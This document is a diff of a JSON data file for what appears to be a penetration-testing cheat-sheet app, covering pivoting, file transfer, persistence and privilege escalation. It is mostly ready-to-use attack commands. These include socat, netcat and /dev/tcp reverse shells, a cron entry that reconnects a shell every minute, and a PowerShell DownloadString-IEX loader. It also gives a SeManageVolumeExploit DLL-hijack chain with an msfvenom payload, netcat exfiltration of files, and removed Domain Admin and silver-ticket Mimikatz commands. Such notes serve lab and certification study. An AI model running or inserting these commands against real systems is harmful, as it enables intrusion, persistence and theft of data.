-          "text": "# Stable reverse shell listener on attacker.\nsocat file:`tty`,raw,echo=0 tcp-listen:<LPORT>\n\n# Victim reverse shell.\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>\n\n# Port forward local listener to an internal service.\nsocat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80\n\n# File transfer receiver and sender.\nsocat tcp-listen:<LPORT> open:received_file,creat\nsocat tcp-connect:<LHOST>:<LPORT> file:<FILE>"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
+          "depth": 3,
           "text": "Ligolo-ng Pivot"
         },
         {
@@ -17992,263 +18191,171 @@
         {
           "type": "heading",
           "depth": 2,
+          "text": "Port Forwarding"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "Chisel Reverse Port Forward"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "Pivoting",
+            "Tunnelling"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Expose target-local services such as `127.0.0.1:1433`, `127.0.0.1:3306`, or `127.0.0.1:5000` back to the attacker box. No admin is required, so this is a strong Windows fallback."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Start the reverse server on Kali."
+          ],
+          "ordered": true,
+          "start": 1
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "chisel server -p <LPORT> --reverse"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Download and run the Windows client on the target."
+          ],
+          "ordered": true,
+          "start": 2
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe\n.\\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Connect to the forwarded service from Kali."
+          ],
+          "ordered": true,
+          "start": 3
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "mysql -u root -h 127.0.0.1 --skip-ssl"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Example: forward target-local MSSQL to Kali."
+          ],
+          "ordered": true,
+          "start": 4
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "netstat -ano\n# Found: 127.0.0.1:1433 LISTENING\n\n# Attacker: start Chisel reverse server.\nchisel server -p 8000 --reverse\n\n# Target: forward local MSSQL back to the attacker.\nchisel.exe client <LHOST>:8000 R:1433:127.0.0.1:1433\n\n# Attacker: connect to the forwarded MSSQL listener.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Example: forward a target-local web service to Kali."
+          ],
+          "ordered": true,
+          "start": 5
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# Found: 127.0.0.1:5000 LISTENING\n\n# Target: forward local web service back to attacker port 9000.\nchisel.exe client <LHOST>:8000 R:9000:127.0.0.1:5000\n\n# Attacker: browse or curl the forwarded service.\ncurl http://127.0.0.1:9000"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "SSH Local / Remote Forward"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Linux",
+            "Pivoting",
+            "Tunnelling"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use SSH forwarding when SSH credentials are available. Local forward is the cleanest path for services reachable from the target; remote forward helps when the service should be exposed back to Kali."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# Target or shell: find local-only listeners.\nss -tulnp\nnetstat -ano\n\n# Found: 127.0.0.1:1433\n# Attacker: local forward target MSSQL to Kali localhost.\nssh -L 1433:127.0.0.1:1433 <USER>@<TARGET_IP>\n\n# Attacker: connect to forwarded MSSQL.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433\n\n# Found: 127.0.0.1:8080\n# Attacker: local forward target web service to Kali localhost.\nssh -L 8080:127.0.0.1:8080 <USER>@<TARGET_IP>\n\n# Attacker: browse or curl the forwarded service.\ncurl http://127.0.0.1:8080\n\n# Found: 127.0.0.1:3306 (MySQL)\n# Target: remote forward target MySQL back to Kali.\nssh -R 3306:127.0.0.1:3306 <USER>@<LHOST>\n\n# Attacker: connect from Kali.\nmysql -h 127.0.0.1 -P 3306"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "Socat"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Linux",
+            "Pivoting",
+            "Tunnelling"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use Socat for stable reverse shells, simple port forwards, or raw file transfers."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# Stable reverse shell listener on attacker.\nsocat file:`tty`,raw,echo=0 tcp-listen:<LPORT>\n\n# Victim reverse shell.\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>\n\n# Port forward local listener to an internal service.\nsocat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80\n\n# Found: 127.0.0.1:3306\n# Target: expose target-local MySQL through target port 3306.\nsocat TCP-LISTEN:3306,fork TCP:127.0.0.1:3306\n\n# Attacker: connect to the forwarded MySQL service.\nmysql -h <TARGET_IP> -P 3306 -u root -p\n\n# Found: 127.0.0.1:8080\n# Target: expose target-local web service through target port 8888.\nsocat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080\n\n# Attacker: browse or curl the forwarded service.\ncurl http://<TARGET_IP>:8888\n\n# File transfer receiver and sender.\nsocat tcp-listen:<LPORT> open:received_file,creat\nsocat tcp-connect:<LHOST>:<LPORT> file:<FILE>"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "Ligolo-ng Localhost Forward"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "Linux",
+            "Pivoting",
+            "Tunnelling"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use this when Ligolo is already connected and started. If not, set up the routed pivot first: [Ligolo-ng Pivot](#view=notes&note=note-pivoting-tunnelling-md&section=note-pivoting-tunnelling-md-tunnelling-pivot-ligolo-ng-pivot)."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# After Ligolo tunnel is started.\nstart\n\n# Found: 127.0.0.1:1433 (MSSQL)\n\n# Ligolo console: forward target localhost -> attacker listener.\nlistener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433\n\n# Result: attacker:1433 -> target:127.0.0.1:1433\n\n# Attacker: connect to the forwarded MSSQL listener.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
           "text": "Notes"
         },
         {
           "type": "list",
           "items": [
-            "Add SSH dynamic forwarding snippets here when those notes are ready."
+            "Ligolo `listener_add` is for target-local services after the Ligolo session is already active."
           ]
-        }
-      ]
-    },
-    {
-      "id": "note-post-exploitation-file-transfer-md",
-      "title": "File Transfer",
-      "source": "Post-Exploitation/File Transfer.md",
-      "tab": "Post-Exploitation",
-      "type": "note",
-      "tags": [
-        "PostExploit",
-        "Linux",
-        "Windows"
-      ],
-      "blocks": [
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Linux"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PostExploit",
-            "Linux"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Quick Linux file download and copy reference."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "# HTTP downloads\nwget http://<LHOST>/<FILE> -O <OUTPUT_FILE>\ncurl http://<LHOST>/<FILE> -o <OUTPUT_FILE>\n\n# Python fallback when wget/curl are missing.\npython3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://<LHOST>:<LPORT>/<FILE>\", \"/tmp/<FILE>\")'\nchmod +x /tmp/<FILE>\n\n# Copy over SSH\nscp <FILE> <USER>@<TARGET_IP>:<REMOTE_PATH>\nscp <USER>@<TARGET_IP>:/path/to/<FILE> .\nscp <FILE> <USER>@<TARGET_IP>:/path/to/dest/"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Windows HTTP"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PostExploit",
-            "Windows"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Quick Windows HTTP download reference."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "# PowerShell Invoke-WebRequest\npowershell -Command \"Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>\"\n\n# PowerShell alias\niwr -Uri http://<LHOST>/<FILE> -OutFile <FILE>\niwr -Uri \"http://$LOCAL_IP/file.exe\" -O file.exe\n\n# certutil\ncertutil -urlcache -split -f \"http://<LHOST>/<FILE>\" <FILE>\ncertutil -urlcache -split -f http://$LOCAL_IP/file.exe file.exe\ncertutil -urlcache -f http://<LHOST>/<FILE> <FILE>\n\n# BITSAdmin\nbitsadmin /transfer job http://<LHOST>/<FILE> C:\\Users\\Public\\<FILE>\n\n# PowerShell in-memory script load\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1') | IEX"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Netcat"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PostExploit",
-            "Linux",
-            "Windows"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Transfer a file over Netcat or use Windows `nc.exe`/`ncat.exe` for shells and file movement."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "# Option 1: simple listener / sender pair.\nnc -lvp <LPORT> < <FILE>\nnc <LHOST> <LPORT> > <FILE>\n\n# Option 2: explicit listener then send the file.\nnc -q 0 -lvp 443 > file\nnc -nv <LHOST> 443 < file\n\n# Windows reverse shell with nc.exe.\nnc.exe -nv <LHOST> <LPORT> -e cmd.exe\nnc.exe -nv <LHOST> <LPORT> -e powershell.exe\n\n# Windows file transfer.\nnc.exe -lvnp <LPORT> > received_file.exe\nnc.exe <LHOST> <LPORT> < file_to_send.exe"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Send Target File To Attacker"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PostExploit",
-            "Linux"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Pull a file from the target back to the attacker over Netcat."
-        },
-        {
-          "type": "list",
-          "items": [
-            "Prepare a sample file on the target if needed."
-          ],
-          "ordered": true,
-          "start": 1
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "echo \"password\" > secret.txt"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Start the receiver on the attacker box."
-          ],
-          "ordered": true,
-          "start": 2
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "nc -lvnp <LPORT> > dump.txt"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Send the file from the target."
-          ],
-          "ordered": true,
-          "start": 3
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "nc <LHOST> <LPORT> < secret.txt"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Send Attacker File To Target"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PostExploit",
-            "Linux"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Push a file from the attacker to the target over Netcat."
-        },
-        {
-          "type": "list",
-          "items": [
-            "Prepare the file on the attacker box."
-          ],
-          "ordered": true,
-          "start": 1
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "echo \"Payload\" > shell.txt"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Start the receiver on the target."
-          ],
-          "ordered": true,
-          "start": 2
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "nc -lvnp <LPORT> > exploit.txt"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Send the file from the attacker box."
-          ],
-          "ordered": true,
-          "start": 3
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "nc <TARGET_IP> <LPORT> < shell.txt"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "SMB"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "SMB",
-            "PostExploit",
-            "Windows"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Host an SMB share and copy files to or from it."
-        },
-        {
-          "type": "list",
-          "items": [
-            "Attacker: start an SMB share."
-          ],
-          "ordered": true,
-          "start": 1
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "impacket-smbserver share . -smb2support -username <USER> -password <PASS>"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Target: copy from the attacker share."
-          ],
-          "ordered": true,
-          "start": 2
-        },
-        {
-          "type": "code",
-          "lang": "cmd",
-          "text": "net use \\\\<LHOST>\\share /user:<USER> <PASS>\ncopy \\\\<LHOST>\\<SHARE>\\<FILE> ."
-        },
-        {
-          "type": "list",
-          "items": [
-            "Target: copy a file back, then disconnect."
-          ],
-          "ordered": true,
-          "start": 3
-        },
-        {
-          "type": "code",
-          "lang": "cmd",
-          "text": "copy <FILE> \\\\<LHOST>\\share\\\nnet use /d \\\\<LHOST>\\share"
         }
       ]
     },
@@ -18257,6 +18364,7 @@
       "title": "Full Interactive Shell",
       "source": "Post-Exploitation/Full Interactive Shell.md",
       "tab": "Post-Exploitation",
+      "note_group": "Post-Exploitation",
       "type": "note",
       "tags": [
         "Shell",
@@ -18377,10 +18485,239 @@
       ]
     },
     {
+      "id": "note-post-exploitation-linux-file-transfer-md",
+      "title": "Linux File Transfer",
+      "source": "Post-Exploitation/Linux File Transfer.md",
+      "tab": "Post-Exploitation",
+      "note_group": "Linux",
+      "type": "note",
+      "tags": [
+        "PostExploit",
+        "Linux"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "HTTP / SSH Copy"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PostExploit",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Quick Linux file download and copy reference."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# HTTP downloads\nwget http://<LHOST>/<FILE> -O <OUTPUT_FILE>\ncurl http://<LHOST>/<FILE> -o <OUTPUT_FILE>\n\n# Python fallback when wget/curl are missing.\npython3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://<LHOST>:<LPORT>/<FILE>\", \"/tmp/<FILE>\")'\nchmod +x /tmp/<FILE>\n\n# Copy over SSH\nscp <FILE> <USER>@<TARGET_IP>:<REMOTE_PATH>\nscp <USER>@<TARGET_IP>:/path/to/<FILE> .\nscp <FILE> <USER>@<TARGET_IP>:/path/to/dest/"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Netcat Pull Target File"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PostExploit",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Pull a file from the target back to the attacker over Netcat."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Prepare a sample file on the target if needed."
+          ],
+          "ordered": true,
+          "start": 1
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "echo \"password\" > secret.txt"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Start the receiver on the attacker box."
+          ],
+          "ordered": true,
+          "start": 2
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "nc -lvnp <LPORT> > dump.txt"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Send the file from the target."
+          ],
+          "ordered": true,
+          "start": 3
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "nc <LHOST> <LPORT> < secret.txt"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Netcat Push Attacker File"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PostExploit",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Push a file from the attacker to the target over Netcat."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Prepare the file on the attacker box."
+          ],
+          "ordered": true,
+          "start": 1
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "echo \"Payload\" > shell.txt"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Start the receiver on the target."
+          ],
+          "ordered": true,
+          "start": 2
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "nc -lvnp <LPORT> > exploit.txt"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Send the file from the attacker box."
+          ],
+          "ordered": true,
+          "start": 3
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "nc <TARGET_IP> <LPORT> < shell.txt"
+        }
+      ]
+    },
+    {
+      "id": "note-post-exploitation-linux-persistence-md",
+      "title": "Linux Persistence",
+      "source": "Post-Exploitation/Linux Persistence.md",
+      "tab": "Post-Exploitation",
+      "note_group": "Linux",
+      "type": "note",
+      "tags": [
+        "Persistence",
+        "Linux"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Linux Crontab Check"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Persistence",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Check if crontab exists."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "which crontab"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Linux Crontab Edit"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Persistence",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Edit current user's crontab."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "crontab -e"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Linux Reverse Shell Cron"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Persistence",
+            "Linux"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Append reverse shell cron entry without interactive editor."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\") | crontab -"
+        }
+      ]
+    },
+    {
       "id": "note-post-exploitation-linux-post-exploitation-md",
       "title": "Linux Post-Exploitation",
       "source": "Post-Exploitation/Linux Post-Exploitation.md",
       "tab": "Post-Exploitation",
+      "note_group": "Linux",
       "type": "note",
       "tags": [
         "Linux",
@@ -18554,97 +18891,136 @@
       ]
     },
     {
-      "id": "note-post-exploitation-persistence-md",
-      "title": "Persistence",
-      "source": "Post-Exploitation/Persistence.md",
+      "id": "note-post-exploitation-windows-file-transfer-md",
+      "title": "Windows File Transfer",
+      "source": "Post-Exploitation/Windows File Transfer.md",
       "tab": "Post-Exploitation",
+      "note_group": "Windows",
       "type": "note",
       "tags": [
-        "Persistence",
-        "Linux",
+        "PostExploit",
         "Windows",
-        "ActiveDirectory"
+        "SMB"
       ],
       "blocks": [
         {
           "type": "heading",
           "depth": 2,
-          "text": "Linux"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Linux Crontab Check"
+          "text": "Windows HTTP"
         },
         {
           "type": "tagline",
           "tags": [
             "Shell",
-            "Persistence",
-            "Linux"
+            "PostExploit",
+            "Windows"
           ]
         },
         {
           "type": "paragraph",
-          "text": "Check if crontab exists."
+          "text": "Quick Windows HTTP download reference."
         },
         {
           "type": "code",
-          "lang": "sh",
-          "text": "which crontab"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Linux Crontab Edit"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Persistence",
-            "Linux"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Edit current user's crontab."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "crontab -e"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Linux Reverse Shell Cron"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Persistence",
-            "Linux"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Append reverse shell cron entry without interactive editor."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\") | crontab -"
+          "lang": "powershell",
+          "text": "# PowerShell Invoke-WebRequest\npowershell -Command \"Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>\"\n\n# PowerShell alias\niwr -Uri http://<LHOST>/<FILE> -OutFile <FILE>\niwr -Uri \"http://$LOCAL_IP/file.exe\" -O file.exe\n\n# certutil\ncertutil -urlcache -split -f \"http://<LHOST>/<FILE>\" <FILE>\ncertutil -urlcache -split -f http://$LOCAL_IP/file.exe file.exe\ncertutil -urlcache -f http://<LHOST>/<FILE> <FILE>\n\n# BITSAdmin\nbitsadmin /transfer job http://<LHOST>/<FILE> C:\\Users\\Public\\<FILE>\n\n# PowerShell in-memory script load\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1') | IEX"
         },
         {
           "type": "heading",
           "depth": 2,
-          "text": "Windows"
+          "text": "Netcat"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PostExploit",
+            "Windows"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use Windows `nc.exe`/`ncat.exe` for shells and file movement."
+        },
+        {
+          "type": "code",
+          "lang": "cmd",
+          "text": "# Windows reverse shell with nc.exe.\nnc.exe -nv <LHOST> <LPORT> -e cmd.exe\nnc.exe -nv <LHOST> <LPORT> -e powershell.exe\n\n# Windows file transfer.\nnc.exe -lvnp <LPORT> > received_file.exe\nnc.exe <LHOST> <LPORT> < file_to_send.exe"
         },
         {
           "type": "heading",
-          "depth": 3,
+          "depth": 2,
+          "text": "SMB Share Copy"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "SMB",
+            "PostExploit",
+            "Windows"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Host an SMB share and copy files to or from it."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Attacker: start an SMB share."
+          ],
+          "ordered": true,
+          "start": 1
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "impacket-smbserver share . -smb2support -username <USER> -password <PASS>"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Target: copy from the attacker share."
+          ],
+          "ordered": true,
+          "start": 2
+        },
+        {
+          "type": "code",
+          "lang": "cmd",
+          "text": "net use \\\\<LHOST>\\share /user:<USER> <PASS>\ncopy \\\\<LHOST>\\<SHARE>\\<FILE> ."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Target: copy a file back, then disconnect."
+          ],
+          "ordered": true,
+          "start": 3
+        },
+        {
+          "type": "code",
+          "lang": "cmd",
+          "text": "copy <FILE> \\\\<LHOST>\\share\\\nnet use /d \\\\<LHOST>\\share"
+        }
+      ]
+    },
+    {
+      "id": "note-post-exploitation-windows-persistence-md",
+      "title": "Windows Persistence",
+      "source": "Post-Exploitation/Windows Persistence.md",
+      "tab": "Post-Exploitation",
+      "note_group": "Windows",
+      "type": "note",
+      "tags": [
+        "Persistence",
+        "Windows"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
           "text": "Windows Local Admin User"
         },
         {
@@ -18666,7 +19042,7 @@
         },
         {
           "type": "heading",
-          "depth": 3,
+          "depth": 2,
           "text": "Windows Enable RDP"
         },
         {
@@ -18690,7 +19066,7 @@
         },
         {
           "type": "heading",
-          "depth": 3,
+          "depth": 2,
           "text": "Windows Execution Policy Bypass"
         },
         {
@@ -18709,79 +19085,6 @@
           "type": "code",
           "lang": "powershell",
           "text": "Set-ExecutionPolicy Bypass -Scope LocalMachine"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Active Directory"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Active Directory Domain Admin User"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "ActiveDirectory",
-            "Persistence"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Add user to Domain Admins when you already have sufficient privileges."
-        },
-        {
-          "type": "code",
-          "lang": "cmd",
-          "text": "net group \"Domain Admins\" <USER> /add /domain"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Active Directory Silver Ticket With Ticketer"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Hash",
-            "Kerberos",
-            "ActiveDirectory",
-            "Persistence"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Create a silver ticket."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "ticketer.py -nthash <MACHINE_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <ANY_USER>"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "Active Directory Silver Ticket With Mimikatz"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Hash",
-            "Kerberos",
-            "ActiveDirectory",
-            "Persistence"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Create and inject a Kerberos service ticket with Mimikatz."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "mimikatz \"kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<TARGET_SERVER> /service:<TARGET_SERVICE> /aes256:<COMPUTER_AES256_KEY> /user:<ANY_USER> /ptt\""
         }
       ]
     },
@@ -18790,6 +19093,7 @@
       "title": "Windows Post-Exploitation",
       "source": "Post-Exploitation/Windows Post-Exploitation.md",
       "tab": "Post-Exploitation",
+      "note_group": "Windows",
       "type": "note",
       "tags": [
         "Windows",
@@ -19147,6 +19451,7 @@
       "title": "Linux Privilege Escalation",
       "source": "Privilege Escalation/Linux Privilege Escalation.md",
       "tab": "Privesc",
+      "note_group": "Linux",
       "type": "note",
       "tags": [
         "Linux",
@@ -19304,6 +19609,10 @@
           "type": "heading",
           "depth": 3,
           "text": "Writable Password Files"
+        },
+        {
+          "type": "paragraph",
+          "text": "Check writable credential files first; editing password material is noisy but very direct when allowed."
         },
         {
           "type": "heading",
@@ -20636,6 +20945,7 @@
       "title": "Potato Family",
       "source": "Privilege Escalation/Potato Family.md",
       "tab": "Privesc",
+      "note_group": "Windows",
       "type": "note",
       "tags": [
         "Windows",
@@ -20793,6 +21103,7 @@
       "title": "Windows Privilege Escalation",
       "source": "Privilege Escalation/Windows Privilege Escalation.md",
       "tab": "Privesc",
+      "note_group": "Windows",
       "type": "note",
       "tags": [
         "Windows",
@@ -21580,6 +21891,28 @@
         {
           "type": "heading",
           "depth": 2,
+          "text": "SeManageVolumeExploit DLL Hijack"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use `SeManageVolumeExploit` when the current Windows token has `SeManageVolumePrivilege`, then abuse the writable `C:\\` permissions to place a DLL payload in `System32\\wbem` and trigger it with `systeminfo`."
+        },
+        {
+          "type": "code",
+          "lang": "cmd",
+          "text": "# Attacker: download the exploit first.\n# https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe\n\n# Target: transfer exploit to victim.\ncertutil -urlcache -split -f \"http://<LHOST>/SeManageVolumeExploit.exe\" SeManageVolumeExploit.exe\n\n# Target: run exploit.\nSeManageVolumeExploit.exe\n# Example output:\n# Entries changed: 925\n# DONE\n\n# Target: check the permission change.\nicacls C:\\\n# Example output:\n# BUILTIN\\Users:(OI)(CI)(F)\n\n# Attacker: create reverse-shell DLL payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\n\n# Target: place payload as tzres.dll in the System32 wbem directory.\ncertutil -urlcache -split -f \"http://<LHOST>/shell.dll\" \"C:\\Windows\\System32\\wbem\\tzres.dll\"\n\n# Attacker: start listener before triggering.\nnc -lvnp <LPORT>\n\n# Target: trigger DLL load.\nsysteminfo\n\n# Attacker shell: confirm callback context.\nwhoami\n# Example output:\n# nt authority\\network service"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
           "text": "UAC Bypass"
         },
         {
@@ -21674,6 +22007,7 @@
       "title": "123 - NTP",
       "source": "Enumeration/Services/123 - NTP.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "NTP",
@@ -21684,6 +22018,19 @@
         {
           "type": "paragraph",
           "text": "`123/udp open ntp`"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `123/udp open ntp`.",
+            "Do: sync time before Kerberos-heavy AD checks and run safe NTP enum scripts.",
+            "Then: retry Kerberos/LDAP tooling if clock skew was causing failures."
+          ]
         },
         {
           "type": "heading",
@@ -21741,9 +22088,23 @@
       "title": "135, 445 - SMB",
       "source": "Enumeration/Services/135, 445 - SMB.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [],
       "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: SMB/RPC ports such as `135`, `139`, or `445`.",
+            "Do: fingerprint signing/domain info, try anonymous/null enum, then enumerate shares/users/policy with creds.",
+            "Then: loot shares, build user lists, check password policy, and test local admin reuse carefully."
+          ]
+        },
         {
           "type": "heading",
           "depth": 2,
